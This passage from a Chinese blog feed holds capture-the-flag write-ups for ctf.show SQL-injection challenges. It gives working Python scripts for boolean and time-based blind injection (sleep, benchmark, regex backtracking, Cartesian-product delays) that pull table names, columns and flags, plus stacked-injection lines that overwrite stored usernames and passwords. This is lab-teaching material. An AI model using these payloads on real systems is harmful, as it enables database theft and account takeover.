class="string">f&quot;admin&#x27; and if(substr((<span class="subst">&#123;payload&#125;</span>), <span class="subst">&#123;i&#125;</span> , 1) regexp (&#x27;<span class="subst">&#123;j&#125;</span>&#x27;), 1, 0)=1#&quot;</span></span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag+=j</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="193-194-substr"><a href="#193-194-substr" class="headerlink" title="193|194 substr"></a>193|194 substr</h3><p><img src="884bf006850e477e5c908959bc58fc49.png" alt="截图"></p><p>过滤了substr，换其他截取字符函数即可，如mid limit等</p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = &quot;admin&#x27; and if((&#123;0&#125;)regexp(&#x27;^&#123;1&#125;&#x27;), 1, 0)=1#&quot;.format(payload, flag + j)</span><br><span class="line">其中^代表就是从第一位开始匹配</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="195"><a href="#195" class="headerlink" title="195"></a>195</h3><p>首先已经提示说明堆叠注入 ，那如果平时怎么想到堆叠注入呢 ，当过滤了联合注入的union select且无法绕过时就可以去考虑这个注入方法<img src="961ffce1f1646e2010eaa08f63e121e2.png" alt="截图"></p><p>最后一个if告知我们要登录成功才能拿到flag，显然就是想办法登录</p><p>但是我们不知道用户名和密码，但是我们通过堆叠注入，写入更新语句，将用户名和密码修改</p><p>但是这里空格被过滤，以及其等替也是，所以可以选择括号包裹或者反引号包裹执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">设置用户名为1</span><br><span class="line">1;update(ctfshow_user)set(username)=1</span><br><span class="line">1;update`ctfshow_user`set`username`=1</span><br><span class="line">设置密码</span><br><span class="line">1;update(ctfshow_user)set(pass)=1</span><br><span class="line">然后 1 1登录即可</span><br></pre></td></tr></table></figure><h3 id="196"><a href="#196" class="headerlink" title="196"></a>196</h3><p><img src="393d1e465a1331ad8d3453009685f845.png" alt="截图"></p><p>限制用户名长度最长不超过16</p><p>一开始以为是什么操作能够绕过这个长度限制</p><p>结果是过滤不严谨，过滤的是se1ect不是select，只能说牛马</p><p>但事实上我还是不会，看wp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:0;select(1)</span><br><span class="line">pass:1</span><br></pre></td></tr></table></figure><p>为什么怎么写呢，因为<img src="98411de54d640b5d3838435be012c3a7.png" alt="截图"></p><p>当此语句中username=0，肯定是不存在的，那么在我们第二个语句select(1)，就会返回此值，即返回1，那么最终结果就是sql=1.在与我们传入的pass比较，相等，登录成功</p><h3 id="197-198-199-200"><a href="#197-198-199-200" class="headerlink" title="197 198 199 200"></a>197 198 199 200</h3><p><img src="2baecba17ecc891c980b9d8930a0ddde.png" alt="截图"></p><p>select，update被过滤，原本想像update一样用其他语句来更新数据，<img src="23567333a49a2cadb8e61ab24ea2c35b.png" alt="截图"></p><p>但是都需要into，显然没办法了</p><p>但是思索上一题，是让本身语句返回不出数据，从而让sql是我们已知的内容</p><p>由之前的题可知表名是ctfshow_user</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0;show tables;</span><br><span class="line">ctfshow_user</span><br></pre></td></tr></table></figure><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><h3 id="214"><a href="#214" class="headerlink" title="214"></a>214</h3><p>什么都没给，麻了，注入口都不知道，</p><p>post传参ip和debug为0</p><p>正常找一个盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://e8bad2f6-84c0-468b-82ad-296231ad10fa.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;debug&#x27;</span>:<span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    start=<span class="number">32</span></span><br><span class="line">    end=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> start&lt;end:</span><br><span class="line">        mid=(start+end)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="comment">#payload=&#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span></span><br><span class="line">        <span class="comment">#payload=&#x27;select group_concat(column_name) from information_schema.columns where table_name=&quot;ctfshow_flagx&quot;&#x27;</span></span><br><span class="line">        payload=<span class="string">&#x27;select flaga from ctfshow_flagx&#x27;</span></span><br><span class="line">        data[<span class="string">&#x27;ip&#x27;</span>]=<span class="string">f&#x27;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1)&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res=requests.post(url,data,timeout=<span class="number">1</span>)</span><br><span class="line">            end=mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            start=mid+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> start!=<span class="number">32</span>:</span><br><span class="line">        result=result+<span class="built_in">chr</span>(start)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="215"><a href="#215" class="headerlink" title="215"></a>215</h3><p><img src="147342c6e7b534f336290b83b8a11d27.png" alt="截图"></p><p>上一题是整数型注入，那么这题大致上是字符型注入，那就加上引号和注释符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://e8bad2f6-84c0-468b-82ad-296231ad10fa.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;debug&#x27;</span>:<span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    start=<span class="number">32</span></span><br><span class="line">    end=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> start&lt;end:</span><br><span class="line">        mid=(start+end)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="comment">#payload=&#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span></span><br><span class="line">        <span class="comment">#payload=&#x27;select group_concat(column_name) from information_schema.columns where table_name=&quot;ctfshow_flagx&quot;&#x27;</span></span><br><span class="line">        payload=<span class="string">&#x27;select flaga from ctfshow_flagx&#x27;</span></span><br><span class="line">        data[<span class="string">&#x27;ip&#x27;</span>]=<span class="string">f&quot;&#x27;||if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1)&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res=requests.post(url,data,timeout=<span class="number">1</span>)</span><br><span class="line">            end=mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            start=mid+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> start!=<span class="number">32</span>:</span><br><span class="line">        result=result+<span class="built_in">chr</span>(start)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这与上一题还有一个差别，就是payload要加上||或语句，这样才能正确执行我们插入的语句，不然会被当成字符串处理无法返回内容</p><h3 id="216"><a href="#216" class="headerlink" title="216"></a>216</h3><p><img src="bf6743aaebd007964940be9e23120e0b.png" alt="截图"></p><p>我们的语句会经过from_base64函数编码，所以我们需要闭合这个函数才能</p><p>更改上一题关键代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[&#x27;ip&#x27;]=f&quot;0)||&#x27;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;</span><br></pre></td></tr></table></figure><h3 id="217-benchmark延时"><a href="#217-benchmark延时" class="headerlink" title="217 benchmark延时"></a>217 benchmark延时</h3><p><img src="6c1aaa0094ef1d27912b9f55729e5a89.png" alt="截图"></p><p>首先肯定要括号闭合一下的，其次存在waf，我们传入的语句不能是sleep的大小写形式</p><p>那么就要找其平替</p><p>参见文章<a href="https://">https://www.jb51.net/article/212587.htm</a></p><p>那就使用benchmark</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(count,exp)执行exp count次</span><br></pre></td></tr></table></figure><p><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f70ed68d-44f9-4ed5-8310-c6fee8c45cfe.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxccb,ctfshow_info</span></span><br><span class="line"><span class="comment">#payload = &quot;if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(8000000,md5(0x31)),1)&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaabc,info,id,ip,cname</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(8000000,md5(0x31)),1)&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(mid((select group_concat(flagaabc) from ctfshow_flagxccb),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(8000000,md5(0x31)),1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, <span class="built_in">ascii</span>: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">ascii</span>),</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = requests.post(url, data=data, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_char(i, p):</span><br><span class="line">            start = p</span><br><span class="line">            time.sleep(<span class="number">10</span>) <span class="comment"># benchmark 跑完大概需要 10s 多，3s 超时后再让它跑 10s，防止阻塞后全部超时影响时间盲注</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有一个注意点，每次跑完都要加上sleep让程序休息一下，不然可能会因为请求过多环境崩溃</p><h3 id="218-RLIKE-REGEXP正则匹配"><a href="#218-RLIKE-REGEXP正则匹配" class="headerlink" title="218 RLIKE REGEXP正则匹配"></a>218 RLIKE REGEXP正则匹配</h3><p><img src="1ac52d7b0c82376555c23e76b73eb31f.png" alt="截图"></p><p>benchmark无了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span><br></pre></td></tr></table></figure><p>以上代码等同于sleep(5)秒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://6a887fe9-0d60-463b-825c-6cfccacc07bb.challenge.ctf.show:8080/api/&quot;</span><br><span class="line"># 表名 ctfshow_flagxc,ctfshow_info</span><br><span class="line"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line"># 列名 id,flagaac</span><br><span class="line"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line"># flag</span><br><span class="line">payload = &quot;ascii(mid((select flagaac from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def valid_payload(p: str) -&gt; bool:</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;debug&quot;: 0,</span><br><span class="line">        &quot;ip&quot;: f&quot;if(&#123;p&#125;,(concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;),1) &quot;</span><br><span class="line">    &#125;</span><br><span class="line">    time_s = time.time()</span><br><span class="line">    _ = requests.post(url, data=data)</span><br><span class="line">    time_e = time.time()</span><br><span class="line">    # 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span><br><span class="line">    return time_e-time_s &gt; 4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = 1</span><br><span class="line">result = &quot;&quot;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    start = 32</span><br><span class="line">    end = 127</span><br><span class="line">    while not(abs(start - end) == 1 or start == end):</span><br><span class="line">        everage = (start + end) // 2</span><br><span class="line">        if valid_payload(payload.format(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        else:</span><br><span class="line">            end = everage</span><br><span class="line">    if end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    if chr(end) == &quot;!&quot;:</span><br><span class="line">        break</span><br><span class="line">    result += chr(end)</span><br><span class="line">    print(f&quot;[*] result: &#123;result&#125;&quot;)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><br></p><p><br></p><h3 id="219-笛卡尔积延时"><a href="#219-笛卡尔积延时" class="headerlink" title="219 笛卡尔积延时"></a>219 笛卡尔积延时</h3><p><img src="fa966d8489b37404b67aecdd1e2aae00.png" alt="截图"></p><p>rlike也无了，所以换笛卡尔积</p><p>一个columns和两个tables的笛卡尔积刚好延时6秒左右</p><p>select count(*) from information_schema.columns A ,information_schema.tables B,information_schema.tables C</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://6a887fe9-0d60-463b-825c-6cfccacc07bb.challenge.ctf.show:8080/api/&quot;</span><br><span class="line"># 表名 ctfshow_flagxc,ctfshow_info</span><br><span class="line"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line"># 列名 id,flagaac</span><br><span class="line"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line"># flag</span><br><span class="line">payload = &quot;ascii(mid((select flagaac from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def valid_payload(p: str) -&gt; bool:</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;debug&quot;: 0,</span><br><span class="line">        &quot;ip&quot;: f&quot;if(&#123;p&#125;,(select count(*) from information_schema.columns A,information_schema.tables B,&quot;</span><br><span class="line">              f&quot;information_schema.tables C),1) &quot;</span><br><span class="line">    &#125;</span><br><span class="line">    time_s = time.time()</span><br><span class="line">    _ = requests.post(url, data=data)</span><br><span class="line">    time_e = time.time()</span><br><span class="line">    # 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span><br><span class="line">    return time_e-time_s &gt; 4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = 1</span><br><span class="line">result = &quot;&quot;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    start = 32</span><br><span class="line">    end = 127</span><br><span class="line">    while not(abs(start - end) == 1 or start == end):</span><br><span class="line">        everage = (start + end) // 2</span><br><span class="line">        if valid_payload(payload.format(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        else:</span><br><span class="line">            end = everage</span><br><span class="line">    if end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    if chr(end) == &quot;!&quot;:</span><br><span class="line">        break</span><br><span class="line">    result += chr(end)</span><br><span class="line">    print(f&quot;[*] result: &#123;result&#125;&quot;)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="220"><a href="#220" class="headerlink" title="220"></a>220</h3><p><img src="25bee1c5b1a56db4bff45f16b7705eed.png" alt="截图"></p><p>延时只能用笛卡尔积，其次ascii被禁了，前面有说过，ord也一样，最后substr也被禁了就不好截取字符比较了，那就只能拼接比较</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://bbdb689b-386c-435c-ae43-e707b9f65a76.challenge.ctf.show:8080/api/&quot;</span><br><span class="line"># 表名 ctfshow_flagxcac</span><br><span class="line"># payload = &quot;left((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span><br><span class="line"># 列名 flagaabcc</span><br><span class="line"># payload = &quot;left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span><br><span class="line"># flag</span><br><span class="line">payload = &quot;left((select flagaabcc from ctfshow_flagxcac limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def valid_payload(p: str) -&gt; bool:</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;debug&quot;: 0,</span><br><span class="line">        &quot;ip&quot;: f&quot;if(&#123;p&#125;,(select count(*) from information_schema.columns A,information_schema.tables B,&quot;</span><br><span class="line">              f&quot;information_schema.tables C),1) &quot;</span><br><span class="line">    &#125;</span><br><span class="line">    time_s = None</span><br><span class="line">    time_e = None</span><br><span class="line">    while True:</span><br><span class="line">        time_s = time.time()</span><br><span class="line">        try:</span><br><span class="line">            _ = requests.post(url, data=data)</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">        time_e = time.time()</span><br><span class="line">        break</span><br><span class="line">    # 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span><br><span class="line">    return time_e-time_s &gt; 4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">letters = &quot;&#123;&#125;_-&quot; + string.ascii_lowercase + string.digits</span><br><span class="line">index = 1</span><br><span class="line">result = &quot;&quot;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    for letter in letters:</span><br><span class="line">        load = payload.format(index, result + letter)</span><br><span class="line">        if valid_payload(load):</span><br><span class="line">            result += letter</span><br><span class="line">            break</span><br><span class="line">    print(f&quot;[*] result: &#123;result&#125;&quot;)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/05/02/hello-world/"/>
      <url>/2023/05/02/hello-world/</url>
      
